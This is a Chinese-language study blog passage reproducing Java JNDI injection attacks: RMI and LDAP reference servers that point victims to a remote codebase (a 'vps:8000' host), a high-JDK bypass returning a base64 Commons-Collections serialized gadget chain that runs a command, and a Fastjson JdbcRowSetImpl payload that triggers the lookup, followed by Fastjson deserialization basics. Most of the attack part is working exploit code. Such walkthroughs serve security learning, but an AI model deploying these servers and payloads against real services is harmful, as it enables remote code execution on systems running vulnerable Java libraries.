<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class calc &#123;</span><br><span class="line">    public calc() throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>server</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class JNDIRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        //initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl());</span><br><span class="line"></span><br><span class="line">        Reference reference = new Reference(&quot;calc&quot;,&quot;calc&quot;,&quot;http://localhost:7777/&quot;);</span><br><span class="line">        initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>client</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">public class JNDIRMIClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        RemoteObj remoteObj = (RemoteObj) initialContext.lookup(&quot;rmi://localhost:1099/remoteObj&quot;);</span><br><span class="line">        System.out.println(remoteObj.sayHello(&quot;hello&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>挂起http服务</p>
<h2 id="复现2"><a href="#复现2" class="headerlink" title="复现2"></a>复现2</h2><p>jndi+ladp（一种协议</p>
<p>这里需要先在 pom.xml 中导入 <code>unboundid-ldapsdk</code> 的依赖。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.unboundid&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;3.2.0&lt;/version&gt;  </span><br><span class="line"> &lt;scope&gt;test&lt;/scope&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p><strong>LdapServer.java</strong></p>
<p>也可以直接用起服务的软件搞，剩下的和上边的一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line">import com.unboundid.ldap.sdk.Entry;  </span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line">import javax.net.ServerSocketFactory;  </span><br><span class="line">import javax.net.SocketFactory;  </span><br><span class="line">import javax.net.ssl.SSLSocketFactory;  </span><br><span class="line">import java.net.InetAddress;  </span><br><span class="line">import java.net.MalformedURLException;  </span><br><span class="line">import java.net.URL;  </span><br><span class="line">  </span><br><span class="line">public class LdapServer &#123;  </span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;  </span><br><span class="line"> public static void main (String[] args) &#123;  </span><br><span class="line">        String url = &quot;http://127.0.0.1:8000/#EvilObject&quot;;  </span><br><span class="line"> int port = 1234;  </span><br><span class="line"> try &#123;  </span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  </span><br><span class="line"> config.setListenerConfigs(new InMemoryListenerConfig(  </span><br><span class="line">                    &quot;listen&quot;,  </span><br><span class="line"> InetAddress.getByName(&quot;0.0.0.0&quot;),  </span><br><span class="line"> port,  </span><br><span class="line"> ServerSocketFactory.getDefault(),  </span><br><span class="line"> SocketFactory.getDefault(),  </span><br><span class="line"> (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line"> config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  </span><br><span class="line"> InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  </span><br><span class="line"> System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);  </span><br><span class="line"> ds.startListening();  </span><br><span class="line"> &#125;  </span><br><span class="line">        catch ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;  </span><br><span class="line">        private URL codebase;  </span><br><span class="line"> /**  </span><br><span class="line"> * */ public OperationInterceptor ( URL cb ) &#123;  </span><br><span class="line">            this.codebase = cb;  </span><br><span class="line"> &#125;  </span><br><span class="line">        /**  </span><br><span class="line"> * &#123;@inheritDoc&#125;  </span><br><span class="line"> * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span><br><span class="line"> */ @Override  </span><br><span class="line"> public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;  </span><br><span class="line">            String base = result.getRequest().getBaseDN();  </span><br><span class="line"> Entry e = new Entry(base);  </span><br><span class="line"> try &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line"> &#125;  </span><br><span class="line">            catch ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;  </span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));  </span><br><span class="line"> System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);  </span><br><span class="line"> e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);  </span><br><span class="line"> String cbstring = this.codebase.toString();  </span><br><span class="line"> int refPos = cbstring.indexOf(&#x27;#&#x27;);  </span><br><span class="line"> if ( refPos &gt; 0 ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(0, refPos);  </span><br><span class="line"> &#125;  </span><br><span class="line">            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  </span><br><span class="line"> e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  </span><br><span class="line"> e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());  </span><br><span class="line"> result.sendSearchEntry(e);  </span><br><span class="line"> result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>JNDILdapClient.java</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line">public class JNDILdapClient &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception&#123;  </span><br><span class="line">        InitialContext initialContext = new InitialContext();  </span><br><span class="line"> RemoteObj remoteObj = (RemoteObj) initialContext.lookup(&quot;ldap://localhost:1099/remoteObj&quot;);  </span><br><span class="line"> System.out.println(remoteObj.sayHello(&quot;hello&quot;));  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="复现3"><a href="#复现3" class="headerlink" title="复现3"></a>复现3</h2><p>高版本绕过</p>
<h3 id="8u191之前"><a href="#8u191之前" class="headerlink" title="8u191之前"></a>8u191之前</h3><p> <strong>jdk8u121 &lt; temp &lt; jdk8u191</strong></p>
<p>加个if，else就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// 旧版本JDK  </span><br><span class="line"> /**  </span><br><span class="line"> * @param className A non-null fully qualified class name.  </span><br><span class="line"> * @param codebase A non-null, space-separated list of URL strings.  </span><br><span class="line"> */  </span><br><span class="line"> public Class&lt;?&gt; loadClass(String className, String codebase)  </span><br><span class="line"> throws ClassNotFoundException, MalformedURLException &#123;  </span><br><span class="line">  </span><br><span class="line"> ClassLoader parent = getContextClassLoader();  </span><br><span class="line"> ClassLoader cl =  </span><br><span class="line"> URLClassLoader.newInstance(getUrlArray(codebase), parent);  </span><br><span class="line">  </span><br><span class="line"> return loadClass(className, cl);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">// 新版本JDK  </span><br><span class="line"> /**  </span><br><span class="line"> * @param className A non-null fully qualified class name.  </span><br><span class="line"> * @param codebase A non-null, space-separated list of URL strings.  </span><br><span class="line"> */  </span><br><span class="line"> public Class&lt;?&gt; loadClass(String className, String codebase)  </span><br><span class="line"> throws ClassNotFoundException, MalformedURLException &#123;  </span><br><span class="line"> if (&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)) &#123;  </span><br><span class="line"> ClassLoader parent = getContextClassLoader();  </span><br><span class="line"> ClassLoader cl =  </span><br><span class="line"> URLClassLoader.newInstance(getUrlArray(codebase), parent);  </span><br><span class="line">  </span><br><span class="line"> return loadClass(className, cl);  </span><br><span class="line"> &#125; else &#123;  </span><br><span class="line"> return null;  </span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>根据 <code>trustURLCodebase的值是否为true</code> 的值来进行判断，它的值默认为 false。通俗的来说，jdk8u191 之后的版本通过添加 <code>trustURLCodebase 的值是否为 true</code> 这一手段，让我们无法加载 codebase，也就是无法让我们进行 URLClassLoader 的攻击了</p>
<h3 id="8u191之后"><a href="#8u191之后" class="headerlink" title="8u191之后"></a>8u191之后</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ol>
<li>要服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用</li>
<li>该恶意 Factory 类必须实现 <code>javax.naming.spi.ObjectFactory</code> 接口，实现该接口的 getObjectInstance() 方法。</li>
<li></li>
</ol>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p><code>org.apache.naming.factory.BeanFactory</code> 类，</p>
<p>具体依赖 Tomcat 中的 jar 包为：catalina.jar、el-api.jar、jasper-el.jar。</p>
<h4 id="利用-LDAP-返回序列化数据，触发本地-Gadget"><a href="#利用-LDAP-返回序列化数据，触发本地-Gadget" class="headerlink" title="利用-LDAP-返回序列化数据，触发本地-Gadget"></a>利用-LDAP-返回序列化数据，触发本地-Gadget</h4><p>插入源码和依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.2.80&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">import com.unboundid.util.Base64;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line">import com.unboundid.ldap.sdk.Entry;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.text.ParseException;</span><br><span class="line"></span><br><span class="line">public class JNDIGadgetServer &#123;</span><br><span class="line"></span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main (String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        String url = &quot;http://vps:8000/#ExportObject&quot;;</span><br><span class="line">        int port = 1234;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;,</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line"></span><br><span class="line">        private URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * */ public OperationInterceptor ( URL cb ) &#123;</span><br><span class="line">            this.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * &#123;@inheritDoc&#125;</span><br><span class="line">         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="line">         */ @Override</span><br><span class="line">        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            try &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            catch ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;</span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br><span class="line">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);</span><br><span class="line">            String cbstring = this.codebase.toString();</span><br><span class="line">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br><span class="line">            if ( refPos &gt; 0 ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(0, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // Payload1: 利用LDAP+Reference Factory  </span><br><span class="line">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  </span><br><span class="line">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  </span><br><span class="line">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());  </span><br><span class="line"></span><br><span class="line">            // Payload2: 返回序列化Gadget</span><br><span class="line">            try &#123;</span><br><span class="line">                e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;));</span><br><span class="line">            &#125; catch (ParseException exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line">import javax.naming.Context;  </span><br><span class="line">import javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line">public class JNDIGadgetClient &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        // lookup参数注入触发  </span><br><span class="line"> Context context = new InitialContext();  </span><br><span class="line"> context.lookup(&quot;ldap://localhost:1234/ExportObject&quot;);  </span><br><span class="line">  </span><br><span class="line"> // Fastjson反序列化JNDI注入Gadget触发  </span><br><span class="line"> String payload =&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><p>像 Jackson 和 fastjson 又有 unicode 和 hex 的编码特性，所以就可以尝试编码绕过，写在log4j上边了</p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ul>
<li><p><code>JSON.toJSONString</code> 将 Java 对象转换为 json 对象，序列化的过程。</p>
</li>
<li><p><code>JSON.parseObject/JSON.parse</code> 将 json 对象重新变回 Java 对象；反序列化的过程</p>
</li>
</ul>
<p>当反序列化指定的类型是Object.class，</p>
<p>即代码为<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>时，</p>
<p>反序列化得到的类的构造函数、所有属性的<code>setter</code>方法、properties私有属性的<code>getter</code>方法都会被调用</p>
